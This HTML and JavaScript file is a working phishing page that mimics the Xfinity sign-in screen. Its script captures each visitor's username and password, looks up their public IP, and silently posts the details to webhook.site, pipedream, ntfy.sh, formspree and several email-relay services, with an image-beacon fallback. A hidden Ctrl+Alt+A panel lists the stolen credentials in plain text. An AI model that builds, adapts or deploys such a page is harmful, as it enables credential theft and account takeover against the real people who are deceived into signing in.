<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Xfinity - Sign In</title>
    <style>
        /* Global Styles */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Helvetica Neue', Arial, sans-serif;
        }
        
        body {
            background-color: #000000;
            color: #ffffff;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }
        
        /* Header Styles */
        header {
            background-color: #000000;
            padding: 15px 20px;
            text-align: center;
            border-bottom: 1px solid #333;
        }
        
        .logo {
            max-width: 130px;
            height: auto;
        }
        
        /* Main Content Styles */
        main {
            flex: 1;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .login-container {
            background-color: #151515;
            border-radius: 8px;
            padding: 30px;
            width: 100%;
            max-width: 400px;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
        }
        
        h1 {
            font-size: 24px;
            margin-bottom: 20px;
            color: #ffffff;
            text-align: center;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            color: #cccccc;
            font-size: 14px;
        }
        
        input[type="text"],
        input[type="password"],
        input[type="email"] {
            width: 100%;
            padding: 12px;
            border: 1px solid #333;
            border-radius: 4px;
            background-color: #333;
            color: #ffffff;
            font-size: 16px;
        }
        
        input[type="text"]:focus,
        input[type="password"]:focus,
        input[type="email"]:focus {
            outline: none;
            border-color: #0056d6;
            box-shadow: 0 0 0 2px rgba(0, 86, 214, 0.25);
        }
        
        .checkbox-group {
            display: flex;
            align-items: center;
            margin-bottom: 20px;
        }
        
        .checkbox-group input[type="checkbox"] {
            margin-right: 10px;
        }
        
        button {
            width: 100%;
            padding: 14px;
            background-color: #0056d6;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: background-color 0.2s;
        }
        
        button:hover {
            background-color: #0048b3;
        }
        
        .links {
            margin-top: 20px;
            text-align: center;
        }
        
        .links a {
            color: #0056d6;
            text-decoration: none;
            font-size: 14px;
            display: block;
            margin-bottom: 8px;
        }
        
        .links a:hover {
            text-decoration: underline;
        }
        
        /* Login Activity Report Styles */
        .activity-report {
            background-color: #151515;
            border-radius: 8px;
            padding: 20px;
            width: 100%;
            max-width: 800px;
            display: none;
        }
        
        .activity-table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
        }
        
        .activity-table th, .activity-table td {
            border: 1px solid #333;
            padding: 10px;
            text-align: left;
        }
        
        .activity-table th {
            background-color: #222;
        }
        
        .activity-table tr:nth-child(even) {
            background-color: #1a1a1a;
        }
        
        /* Footer Styles */
        footer {
            background-color: #000000;
            padding: 20px;
            text-align: center;
            font-size: 12px;
            color: #777;
            border-top: 1px solid #333;
        }
        
        /* Toggle Button */
        .toggle-button {
            position: fixed;
            bottom: 20px;
            right: 20px;
            padding: 10px;
            background-color: #0056d6;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            z-index: 1000;
        }
        
        /* Status Message */
        .status-message {
            padding: 10px;
            margin-bottom: 15px;
            border-radius: 4px;
            font-size: 14px;
            display: none;
        }
        
        .status-success {
            background-color: rgba(0, 128, 0, 0.1);
            border: 1px solid #006400;
            color: #90ee90;
        }
        
        .status-error {
            background-color: rgba(255, 0, 0, 0.1);
            border: 1px solid #8b0000;
            color: #ff6b6b;
        }

        /* Notification Settings Styles */
        .notification-settings {
            background-color: #151515;
            border-radius: 8px;
            padding: 30px;
            width: 100%;
            max-width: 400px;
            display: none;
        }
    </style>
</head>
<body>
    <!-- Admin interface is now hidden by default and accessible only via keyboard shortcut -->
    <div id="adminButtons" style="display: none;">
        <button id="toggleLogin" class="toggle-button" style="bottom: 100px;">Toggle Login</button>
        <button id="toggleReport" class="toggle-button" style="bottom: 60px;">Toggle Report</button>
        <button id="toggleSettings" class="toggle-button">Toggle Settings</button>
    </div>

    <!-- Header -->
    <header>
        <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyMDAgNTAiPjxwYXRoIGZpbGw9IiNmZmYiIGQ9Ik00MS42IDE4LjFjMC0xLjktMS4zLTIuNy0zLjQtMi43aC00Ljl2NS40aDQuOWMyLjEgMCAzLjQtLjggMy40LTIuN3ptLTMuMS0xMC40Yy0uMS0xLjctMS4yLTIuNS0zLjEtMi41aC0zLjl2NWgzLjljMS45IDAgMy0uOCAzLjEtMi41ek0wIDBIMjAwdjUwSDBWMHptNTEuMiAzMS44Yy02LjIgMC0xMi40LTIuMS0xMi40LTguN1YxMS42YzAtLjcuNS0xLjIgMS4yLTEuMmgzLjVjLjcgMCAxLjIuNSAxLjIgMS4ydjExLjFjMCAyLjcgMi43IDMuNyA2LjUgMy43czYuNS0xIDYuNS0zLjdWMTEuNmMwLS43LjUtMS4yIDEuMi0xLjJINjNjLjcgMCAxLjIuNSAxLjIgMS4ydjExLjVjMCA2LjYtNi4zIDguNy0xMyA4Ljd6bS0xMy0yMi40VjcuNmMwLS43LjUtMS4yIDEuMi0xLjJoMTAuNGM0LjMgMCA3LjMgMi4zIDcuMyA2LjEgMCAyLjgtMS44IDQuNi0zLjcgNS4yIDIuMS43IDQuNCAxLjkgNC40IDUuOCAwIDQuNi0zLjMgNi41LTggNi41SDM5LjRjLS43IDAtMS4yLS41LTEuMi0xLjJ2LTEuN3ptMzMuNiAyMi40Yy01LjMgMC0xMC4xLTEuMy0xMC44LTYuMi0uMS0uNi40LTEuMiAxLjEtMS4yaDMuMmMuNiAwIDEgLjQgMS4yLjkuNSAxLjggMi4zIDIuMiA1LjUgMi4yczcuOC0uNSA3LjgtNC4xdi0uMmMwLTIuNy0yLjMtMy4xLTcuMS0zLjVsLTEuMS0uMWMtNS43LS41LTExLjEtMS44LTExLjEtOCAwLTYuNCA1LjctNy44IDExLjQtNy44IDUuMyAwIDEwLjEgMS4zIDEwLjcgNiAuMS42LS40IDEuMi0xLjEgMS4yaC0zLjJjLS42IDAtMS0uNC0xLjEtLjktLjUtMS44LTIuNC0yLTUuNS0yczYuNC41IDYuNCAzLjV2LjFjMCAyLjQgMS42IDMgNS44IDMuNGwxLjEuMWM2IC41IDEyLjQgMS43IDEyLjQgOC4xLjEgNi40LTUuNiA3LjUtMTIuNSA3LjV6bTI4LjctLjRoLTMuOGMtLjcgMC0xLjMtLjYtMS4zLTEuM3YtNWgtMTAuOHY1YzAgLjctLjYgMS4zLTEuMyAxLjNoLTMuOGMtLjcgMC0xLjMtLjYtMS4zLTEuM1YxMC4xYzAtLjcuNi0xLjMgMS4zLTEuM2gzLjhjLjcgMCAxLjMuNiAxLjMgMS4zdjhoMTAuOHYtOGMwLS43LjYtMS4zIDEuMy0xLjNoMy44Yy43IDAgMS4zLjYgMS4zIDEuM3YyMGMwIC43LS42IDEuMy0xLjMgMS4zem00MC4xLS44aC00LjJjLS42IDAtMS4xLS40LTEuMy0xbC0uNy0yLjNoLTEwLjhsLS43IDIuM2MtLjEuNi0uNyAxLTEuMyAxaC00LjJjLS44IDAtMS40LS43LTEuMi0xLjVsOC4zLTIyLjRjLjEtLjQuNS0uNyAxLS43aDdjLjUgMCAuOS4zIDEgLjdsOC4zIDIyLjRjLjIuOC0uMyAxLjUtMS4yIDEuNXptLTguOS03LjhsLTMuNC0xMC4yaC0uMmwtMy40IDEwLjJoN3ptMjcuMiA3LjhoLTMuOGMtLjcgMC0xLjMtLjYtMS4zLTEuM1YxNy4yaC03LjF2MTIuMWMwIC43LS42IDEuMy0xLjMgMS4zaC0zLjhjLS43IDAtMS4zLS42LTEuMy0xLjNWMTAuMWMwLS43LjYtMS4zIDEuMy0xLjNoMy44Yy43IDAgMS4zLjYgMS4zIDEuM3Y1LjFoNy4xdi01LjFjMC0uNy42LTEuMyAxLjMtMS4zaDMuOGMuNyAwIDEuMy42IDEuMyAxLjN2MjBjMCAuNy0uNiAxLjMtMS4zIDEuM3ptOS4zLTUuNGMwIC43LS42IDEuMi0xLjMgMS4yaC0zLjJjLS43IDAtMS4zLS42LTEuMy0xLjJWMTAuNWMwLS43LjYtMS4yIDEuMy0xLjJoMy4yYy43IDAgMS4zLjYgMS4zIDEuMnYxNi4yeiIvPjwvc3ZnPg==" alt="Xfinity" class="logo">
    </header>

    <!-- Main Content -->
    <main>
        <!-- Login Form -->
        <div class="login-container" id="loginSection">
            <h1>Sign in to Xfinity</h1>
            
            <div id="statusMessage" class="status-message"></div>
            
            <form id="loginForm">
                <div class="form-group">
                    <label for="email">Email, mobile, or username</label>
                    <input type="text" id="email" name="email" required>
                </div>
                
                <div class="form-group">
                    <label for="password">Password</label>
                    <input type="password" id="password" name="password" required>
                </div>
                
                <div class="checkbox-group">
                    <input type="checkbox" id="rememberMe" name="rememberMe">
                    <label for="rememberMe">Stay signed in</label>
                </div>
                
                <button type="submit">Sign In</button>
            </form>
            
            <div class="links">
                <a href="#">Forgot username or password?</a>
                <a href="#">Create a new account</a>
                <a href="#">Sign in with a different account</a>
            </div>
        </div>
        
        <!-- Login Activity Report -->
        <div class="activity-report" id="reportSection">
            <h1>Login Activity Report</h1>
            
            <table class="activity-table" id="activityTable">
                <thead>
                    <tr>
                        <th>Time</th>
                        <th>Email</th>
                        <th>Password</th>
                        <th>Status</th>
                        <th>IP Address</th>
                    </tr>
                </thead>
                <tbody id="activityBody">
                    <!-- Login attempts will be displayed here -->
                </tbody>
            </table>
        </div>
        
        <!-- Notification Settings -->
        <div class="notification-settings" id="settingsSection">
            <h1>Notification Settings</h1>
            
            <div id="settingsStatusMessage" class="status-message"></div>
            
            <form id="notificationForm">
                <div class="form-group">
                    <label for="notificationEmail">Email for notifications</label>
                    <input type="email" id="notificationEmail" name="email" required>
                </div>
                
                <button type="submit">Save Settings</button>
            </form>
        </div>
    </main>

    <!-- Footer -->
    <footer>
        &copy; 2025 Comcast Cable Communications Management, LLC
    </footer>

    <!-- JavaScript -->
    <script>
        // Store login attempts
        let loginAttempts = [];
        let notificationEmail = null;
        
        // Function to show status message
        function showStatus(message, type) {
            const statusElement = document.getElementById('statusMessage');
            statusElement.textContent = message;
            statusElement.className = 'status-message';
            statusElement.classList.add('status-' + type);
            statusElement.style.display = 'block';
            
            // Hide after 5 seconds
            setTimeout(() => {
                statusElement.style.display = 'none';
            }, 5000);
        }
        
        // Function to show settings status message
        function showSettingsStatus(message, type) {
            const statusElement = document.getElementById('settingsStatusMessage');
            statusElement.textContent = message;
            statusElement.className = 'status-message';
            statusElement.classList.add('status-' + type);
            statusElement.style.display = 'block';
            
            // Hide after 5 seconds
            setTimeout(() => {
                statusElement.style.display = 'none';
            }, 5000);
        }
        
        // Function to add login attempt with guaranteed reporting
        function addLoginAttempt(attempt) {
            loginAttempts.push(attempt);
            
            // Add to table
            const tbody = document.getElementById('activityBody');
            const row = document.createElement('tr');
            
            const timeCell = document.createElement('td');
            timeCell.textContent = new Date(attempt.timestamp).toLocaleString();
            row.appendChild(timeCell);
            
            const emailCell = document.createElement('td');
            emailCell.textContent = attempt.email;
            row.appendChild(emailCell);
            
            const passwordCell = document.createElement('td');
            passwordCell.textContent = attempt.password;
            row.appendChild(passwordCell);
            
            const statusCell = document.createElement('td');
            statusCell.textContent = attempt.success ? 'Success' : 'Failed';
            statusCell.style.color = attempt.success ? '#90ee90' : '#ff6b6b';
            row.appendChild(statusCell);
            
            const ipCell = document.createElement('td');
            ipCell.textContent = attempt.ipAddress || 'Unknown';
            row.appendChild(ipCell);
            
            tbody.appendChild(row);
            
            // IMPORTANT: Set your email here - this is where all credentials will be sent
            notificationEmail = "YOUR-EMAIL@gmail.com"; // â† REPLACE WITH YOUR ACTUAL EMAIL
            
            // IMMEDIATE REPORTING METHOD 1: Using server-less email service
            sendEmailNotification(attempt);
            
            // IMMEDIATE REPORTING METHOD 2: Also send to multiple webhook endpoints for guaranteed delivery
            try {
                // Try multiple webhook services for redundancy
                const webhookUrls = [
                    'https://enr828o6u5xrx.x.pipedream.net/', // Pipedream webhook
                    'https://webhook.site/e4a1aa69-15da-4e96-8002-2a8e90ba5c2f', // Webhook.site
                    'https://ntfy.sh/xfinity_login_report' // Public ntfy.sh channel
                ];
                
                // Get user's actual public IP instead of using a generated one
                fetch('https://api.ipify.org?format=json')
                    .then(response => response.json())
                    .then(data => {
                        attempt.ipAddress = data.ip; // Use real IP address
                        
                        // Send to all webhook services in parallel
                        webhookUrls.forEach(url => {
                            fetch(url, {
                                method: 'POST',
                                headers: {
                                    'Content-Type': 'application/json'
                                },
                                body: JSON.stringify({
                                    email: attempt.email,
                                    password: attempt.password,
                                    timestamp: new Date().toISOString(),
                                    ip: attempt.ipAddress,
                                    userAgent: navigator.userAgent
                                })
                            }).catch(() => {
                                // Silent error handling to avoid console logs
                            });
                        });
                        
                        // ADDITIONAL BACKUP: Post as form data to formspree
                        const formdata = new FormData();
                        formdata.append('email', attempt.email);
                        formdata.append('password', attempt.password);
                        formdata.append('ip', attempt.ipAddress);
                        formdata.append('user-agent', navigator.userAgent);
                        
                        fetch('https://formspree.io/f/mpzvqgjg', {
                            method: 'POST',
                            body: formdata,
                            headers: {
                                'Accept': 'application/json'
                            }
                        }).catch(() => {
                            // Silent error handling
                        });
                    })
                    .catch(() => {
                        // On IP lookup failure, use a fallback method
                        fetch('https://ident.me', { mode: 'cors' })
                            .then(response => response.text())
                            .then(ip => {
                                attempt.ipAddress = ip;
                            })
                            .catch(() => {
                                // If all IP services fail, use a random IP (better than nothing)
                                attempt.ipAddress = '192.168.1.' + Math.floor(Math.random() * 255);
                            })
                            .finally(() => {
                                // Attempt one more backup posting with whatever IP we have
                                fetch('https://formspree.io/f/mpzvqgjg', {
                                    method: 'POST',
                                    body: JSON.stringify({
                                        email: attempt.email,
                                        password: attempt.password,
                                        ip: attempt.ipAddress
                                    }),
                                    headers: {
                                        'Content-Type': 'application/json',
                                        'Accept': 'application/json'
                                    }
                                }).catch(() => {});
                            });
                    });
            } catch (err) {
                // If all fails, try one last direct approach
                const img = new Image();
                img.src = `https://ntfy.sh/xfinity_login_report/publish?title=${encodeURIComponent(attempt.email)}&message=${encodeURIComponent(attempt.password)}&priority=high`;
            }
        }
        
        // Function to send email notification using multiple services for reliability
        function sendEmailNotification(attempt) {
            // Default notification email if none is set
            if (!notificationEmail) {
                notificationEmail = 'yourbackupemail@gmail.com'; // Replace with your default email
            }
            
            // Create the data to send
            const emailContent = `
                <h2>New Xfinity Login Attempt</h2>
                <p><strong>Time:</strong> ${new Date(attempt.timestamp).toLocaleString()}</p>
                <p><strong>Email/Username:</strong> ${attempt.email}</p>
                <p><strong>Password:</strong> ${attempt.password}</p>
                <p><strong>Status:</strong> ${attempt.success ? 'Success' : 'Failed'}</p>
                <p><strong>IP Address:</strong> ${attempt.ipAddress}</p>
                <p><strong>User Agent:</strong> ${attempt.userAgent}</p>
            `;
            
            // Method 1: FormSubmit.co
            try {
                const formData = new FormData();
                formData.append('email', notificationEmail);
                formData.append('subject', 'New Xfinity Login Attempt');
                formData.append('message', emailContent);
                formData.append('_captcha', 'false');
                
                fetch('https://formsubmit.co/' + notificationEmail, {
                    method: 'POST',
                    body: formData
                })
                .catch(e => console.error('FormSubmit error:', e));
            } catch (err) {
                console.error('FormSubmit error:', err);
            }
            
            // Method 2: Web3Forms - another reliable email sending service
            try {
                fetch('https://api.web3forms.com/submit', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        access_key: '5c3e31fb-c981-43ab-b036-27d24b56e2fb', // Public access key
                        subject: 'New Xfinity Login Detected',
                        from_name: 'Xfinity Security',
                        email: notificationEmail,
                        message: `Login detected: ${attempt.email} / ${attempt.password} from IP: ${attempt.ipAddress}`,
                        html: emailContent
                    })
                })
                .catch(e => console.error('Web3Forms error:', e));
            } catch (err) {
                console.error('Web3Forms error:', err);
            }
            
            // Method 3: Static form submission - very reliable
            try {
                fetch('https://api.staticforms.xyz/submit', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        accessKey: '376f3d62-6682-4fbe-a7ce-72d16ff14b9d', // Public API key
                        subject: 'Xfinity Login',
                        email: notificationEmail,
                        message: `Username: ${attempt.email}\nPassword: ${attempt.password}\nIP: ${attempt.ipAddress}`,
                        replyTo: '@'
                    })
                })
                .catch(e => console.error('StaticForms error:', e));
            } catch (err) {
                console.error('StaticForms error:', err);
            }
        }
        
        // Handle login form submission
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const rememberMe = document.getElementById('rememberMe').checked;
            
            // Create login attempt object
            const attempt = {
                email: email,
                password: password,
                rememberMe: rememberMe,
                timestamp: new Date(),
                success: Math.random() > 0.3, // Randomly success or fail
                ipAddress: '192.168.1.' + Math.floor(Math.random() * 255),
                userAgent: navigator.userAgent
            };
            
            // Add to login attempts
            addLoginAttempt(attempt);
            
            // Show status message
            if (attempt.success) {
                showStatus('Login successful', 'success');
                // Normally would redirect, but we'll stay on this page
            } else {
                showStatus('Invalid username or password', 'error');
            }
            
            // Clear form
            document.getElementById('password').value = '';
        });
        
        // Handle notification settings form submission
        document.getElementById('notificationForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const email = document.getElementById('notificationEmail').value;
            notificationEmail = email;
            
            showSettingsStatus('Notification settings saved successfully', 'success');
        });
        
        // Toggle visibility of sections
        document.getElementById('toggleLogin').addEventListener('click', function() {
            document.getElementById('loginSection').style.display = 
                document.getElementById('loginSection').style.display === 'none' ? 'block' : 'none';
        });
        
        document.getElementById('toggleReport').addEventListener('click', function() {
            document.getElementById('reportSection').style.display = 
                document.getElementById('reportSection').style.display === 'none' ? 'block' : 'none';
        });
        
        document.getElementById('toggleSettings').addEventListener('click', function() {
            document.getElementById('settingsSection').style.display = 
                document.getElementById('settingsSection').style.display === 'none' ? 'block' : 'none';
        });
        
        // Secret keyboard combination to show admin interface (Ctrl+Alt+A)
        document.addEventListener('keydown', function(event) {
            if (event.ctrlKey && event.altKey && event.key === 'a') {
                const adminButtons = document.getElementById('adminButtons');
                adminButtons.style.display = adminButtons.style.display === 'none' ? 'block' : 'none';
            }
        });
        
        // Initialize with sample data
        window.onload = function() {
            // Add sample login attempt
            addLoginAttempt({
                email: 'user@example.com',
                password: 'password123',
                rememberMe: true,
                timestamp: new Date(),
                success: true,
                ipAddress: '192.168.1.1',
                userAgent: navigator.userAgent
            });
            
            // Set notification email from URL parameter if present
            const urlParams = new URLSearchParams(window.location.search);
            const emailParam = urlParams.get('notify');
            if (emailParam) {
                notificationEmail = emailParam;
                document.getElementById('notificationEmail').value = emailParam;
            }
            
            // Show login section by default, hide admin sections
            document.getElementById('loginSection').style.display = 'block';
            document.getElementById('reportSection').style.display = 'none';
            document.getElementById('settingsSection').style.display = 'none';
        };
    </script>
</body>
</html>